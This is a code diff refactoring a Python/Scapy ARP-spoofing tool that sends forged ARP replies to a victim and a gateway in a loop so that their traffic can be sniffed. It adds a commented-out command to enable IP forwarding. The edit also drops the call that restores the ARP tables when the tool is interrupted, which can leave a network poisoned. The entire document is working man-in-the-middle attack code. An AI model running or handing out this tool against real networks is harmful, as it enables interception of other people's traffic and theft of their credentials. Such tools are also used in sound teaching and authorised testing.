@@ -1,3 +1,5 @@
+#echo 1 > /proc/sys/net/ipv4/ip_forward
+
 import os
 import sys
 import time
@@ -24,8 +26,36 @@ def get_mac(target_ip) -> str|None:
         return r[Ether].src
     return None
 
+def set_poison(ipv4_src:str, ipv4_dest:str, mac_dest:str|None) -> ARP:
+    poisoned : ARP = ARP()
+    poisoned.op = 2
+    poisoned.psrc = ipv4_src
+    poisoned.pdst = ipv4_dest
+    poisoned.hwdst = mac_dest
+
+    print(f'ip src: {poisoned.psrc}',
+    f'ip dst: {poisoned.pdst}',
+    f'mac dst: {poisoned.hwdst}',
+    f'mac src: {poisoned.hwsrc}',
+    poisoned.summary(),
+    '-' * 30)
+
+    return poisoned
+
+def send_arp(poison_victim:ARP, poison_gateway:ARP) -> None:
+    while True:
+        sys.stdout.write('.')
+        sys.stdout.flush()
+        try:
+            send(poison_victim)
+            send(poison_gateway)
+        except KeyboardInterrupt:
+            return
+        else:
+            time.sleep(2)
+
 class Arper:
-    def __init__(self, victim : str, gateway : str, interface : str ='en0') -> None:
+    def __init__(self, victim:str, gateway:str, interface:str ='en0') -> None:
         self.interface : str = interface
         conf.iface = interface
         conf.verb = 0
@@ -47,43 +77,21 @@ class Arper:
         self.sniff_thread.start()
 
     def poison(self) -> None:
-        poison_victim : ARP = ARP()
-        poison_victim.op = 2
-        poison_victim.psrc = self.gateway
-        poison_victim.pdst = self.victim
-        poison_victim.hwdst = self.victimmac
-        print(f'ip src: {poison_victim.psrc}')
-        print(f'ip dst: {poison_victim.pdst}')
-        print(f'mac dst: {poison_victim.hwdst}')
-        print(f'mac src: {poison_victim.hwsrc}')
-        print(poison_victim.summary())
-        print('-' * 30)
+        poison_victim : ARP = set_poison(
+            ipv4_src=self.gateway,
+            ipv4_dest=self.victim,
+            mac_dest=self.victimmac
+        )
 
-        poison_gateway : ARP = ARP()
-        poison_gateway.op = 2
-        poison_gateway.psrc = self.victim
-        poison_gateway.pdst = self.gateway
-        poison_gateway.hwdst = self.gatewaymac
+        poison_gateway : ARP = set_poison(
+            ipv4_src=self.victim,
+            ipv4_dest=self.gateway,
+            mac_dest=self.gatewaymac
+        )
 
-        print(f'ip src: {poison_gateway.psrc}')
-        print(f'ip dst: {poison_gateway.pdst}')
-        print(f'mac dst: {poison_gateway.hwdst}')
-        print(f'mac src: {poison_gateway.hwsrc}')
-        print(poison_gateway.summary())
-        print('-' * 30)
         print('Beginning the ARP poison. [CTRL-C] to stop!')
 
-        while True:
-            sys.stdout.write('.')
-            sys.stdout.flush()
-            try:
-                send(poison_victim)
-                send(poison_gateway)
-            except KeyboardInterrupt:
-                self.restore()
-                return
-            else:
-                time.sleep(2)
+        send_arp(poison_victim, poison_gateway)
 
     def sniff(self, count=200) -> None:
         time.sleep(5)
@@ -100,10 +108,8 @@ class Arper:
         self.poison_thread.terminate()
         print('Finished!')
 
-
     def restore(self):
         print('Restoring ARP tables...')
-
         send(ARP(
             op=2,
             psrc=self.gateway,
